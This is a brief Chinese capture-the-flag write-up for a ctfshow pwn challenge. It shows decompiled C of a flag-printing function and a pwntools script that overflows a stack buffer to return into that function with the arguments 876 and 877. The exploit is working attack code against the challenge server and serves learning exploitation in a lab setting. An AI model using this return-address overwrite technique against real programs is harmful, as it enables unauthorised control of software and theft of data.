# 挑战简介
迎面走来的flag让我如此蠢蠢欲动

# 思路
IDA翻看，直接看到一个flag函数

```
char *__cdecl flag(int a1, int a2)
{
  char *result; // eax
  char s; // [esp+Ch] [ebp-4Ch]
  FILE *stream; // [esp+4Ch] [ebp-Ch]

  stream = fopen("/ctfshow_flag", (const char *)&unk_8048830);
  if ( !stream )
  {
    puts("/ctfshow_flag: No such file or directory.");
    exit(0);
  }
  result = fgets(&s, 64, stream);
  if ( a1 == 876 && a2 == 877 )
    result = (char *)printf(&s);
  return result;
}
```

flag调用，并传递两个参数，分别是876，877，就可以成功获得flag

```
from pwn import *
from LibcSearcher import *
context.log_level = "debug"

p= remote("pwn.challenge.ctf.show",28174)
elf = ELF('D:\edge 下载\pwn')

offset = 0x6C + 0x4

flag_addr = elf.symbols['flag']

payload = b'a'*offset + p32(flag_addr) + b"AAAA" + p32(876) + p32(877) 

print(payload)

p.sendline(payload)

p.interactive()

```
